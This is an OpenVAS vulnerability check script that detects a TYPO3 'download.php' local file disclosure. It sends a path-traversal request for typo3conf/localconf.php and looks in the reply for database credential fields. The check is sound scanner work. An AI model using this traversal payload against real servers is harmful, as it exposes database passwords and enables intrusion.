###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_typo3_49882.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# TYPO3 'download.php' Local File Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:typo3:typo3";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103291");
  script_version("$Revision: 11997 $");
  script_bugtraq_id(49882);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-10-06 13:32:57 +0200 (Thu, 06 Oct 2011)");
  script_name("TYPO3 'download.php' Local File Disclosure Vulnerability");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to obtain potentially sensitive
information from local files on computers running the vulnerable application.
This may aid in further attacks.");
  script_tag(name:"vuldetect", value:"Send a crafted GET request and check for the response.");
  script_tag(name:"insight", value:"An error exist in download.php script, which fails to adequately validate
user-supplied input.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"This host is installed with TYPO3 and is prone to local file-disclosure
vulnerability.");
  script_tag(name:"affected", value:"TYPO3 version Unspecified");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49882");
  script_xref(name:"URL", value:"http://typo3.org");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_typo3_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TYPO3/installed");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");


if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

url = string(dir, "/fileadmin/download.php?Fichier_a_telecharger=../typo3conf/localconf.php ");

if(http_vuln_check(port:port, url:url,pattern:"TYPO3_CONF_VARS",extra_check:make_list("typo_db_password","typo_db_host","typo_db_username"))) {

  security_message(port:port);
  exit(0);
}

exit(99);
